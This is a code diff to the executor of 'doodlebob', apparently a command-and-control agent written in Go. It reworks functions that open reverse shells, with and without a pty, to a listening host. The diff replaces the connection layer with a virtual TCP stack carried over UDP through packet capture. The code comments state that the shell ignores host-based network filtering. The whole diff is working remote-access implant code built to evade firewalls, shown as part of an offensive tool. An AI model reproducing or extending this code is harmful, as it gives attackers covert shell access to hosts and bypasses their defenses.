@@ -3,9 +3,11 @@ package executor
 
 import (
 	"context"
+	"errors"
 	"fmt"
 	"io"
 	"net"
+	"net/netip"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -14,7 +16,7 @@ import (
 
 	"github.com/MeHungr/doodlebob/internal/message"
 	"github.com/MeHungr/doodlebob/pkg/network"
-	"github.com/MeHungr/doodlebob/pkg/pcapconn"
+	"github.com/MeHungr/pcapnet"
 	"github.com/creack/pty"
 )
 
@@ -70,7 +72,6 @@ func OpenReverseShellPty(ip, port string) error {
 	return cmd.Wait()
 }
 
-
 // runPcapShell owns stdin copying so process exit does not wait for network EOF.
 func runPcapShell(cmd *exec.Cmd, conn net.Conn) error {
 	stdin, err := cmd.StdinPipe()
@@ -108,7 +109,7 @@ func runPcapShell(cmd *exec.Cmd, conn net.Conn) error {
 // OpenPcapReverseShell opens an OS agnostic reverse shell to a listening host
 // This uses the pcapconn implementation of net.Conn
 // This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
-func OpenPcapReverseShell(msg *message.Message) error {
+func OpenPcapReverseShell(msg *message.Message) (resultErr error) {
 	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer stop()
 
@@ -129,13 +130,40 @@ func OpenPcapReverseShell(msg *message.Message) error {
 	}
 
 	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
-	conn, err := pcapconn.Dial(
-		dialCtx, device, sourcePort, targetIP, targetPort,
-	)
-	cancel()
+
+	// Spin up virtual TCP stack
+	cfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalPort: uint16(sourcePort), ReserveUDPPort: false}
+	var vstack *pcapnet.VirtualStack
+	var assigned pcapnet.Assignment
+	peer, err := netip.ParseAddrPort(targetIP + ":" + msg.SrcPort)
 	if err != nil {
+		cancel()
+		return fmt.Errorf("invalid -peer: %w", err)
+	}
+
+	// Clean up the stack
+	defer func() { vstack.Close(); resultErr = errors.Join(resultErr, vstack.Err()) }()
+
+	// Dial via UDP to the server
+	vstack, assigned, err = pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200)
+	if err != nil {
+		cancel()
 		return err
 	}
+
+	// Dial TCP stack
+	conn, err := vstack.Dial(dialCtx, assigned.ServerIP.String(), targetPort)
+	if err != nil {
+		cancel()
+		return err
+	}
+	defer func() { resultErr = errors.Join(resultErr, conn.Close()) }()
+	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
+		cancel()
+		return err
+	}
+
+	cancel()
 	defer conn.Close()
 
 	// Dial's context only controls connection establishment.
@@ -203,7 +231,7 @@ func runPcapShellPty(cmd *exec.Cmd, conn net.Conn) error {
 // This uses the pcapconn implementation of net.Conn
 // This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
 // Spawns a pty. More risk--if pty is killed, so is doodleagent
-func OpenPcapReverseShellPty(msg *message.Message) error {
+func OpenPcapReverseShellPty(msg *message.Message) (resultErr error) {
 	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer stop()
 
@@ -224,9 +252,39 @@ func OpenPcapReverseShellPty(msg *message.Message) error {
 	}
 
 	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
-	conn, err := pcapconn.Dial(
-		dialCtx, device, sourcePort, targetIP, targetPort,
-	)
+
+	// Spin up virtual TCP stack
+	cfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalPort: uint16(sourcePort), ReserveUDPPort: false}
+	var vstack *pcapnet.VirtualStack
+	var assigned pcapnet.Assignment
+	peer, err := netip.ParseAddrPort(targetIP + ":" + msg.SrcPort)
+	if err != nil {
+		cancel()
+		return fmt.Errorf("invalid -peer: %w", err)
+	}
+
+	// Clean up the stack
+	defer func() { vstack.Close(); resultErr = errors.Join(resultErr, vstack.Err()) }()
+
+	// Dial via UDP to the server
+	vstack, assigned, err = pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200)
+	if err != nil {
+		cancel()
+		return err
+	}
+
+	// Dial TCP stack
+	conn, err := vstack.Dial(dialCtx, assigned.ServerIP.String(), targetPort)
+	if err != nil {
+		cancel()
+		return err
+	}
+	defer func() { resultErr = errors.Join(resultErr, conn.Close()) }()
+	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
+		cancel()
+		return err
+	}
+
 	cancel()
 	if err != nil {
 		return err
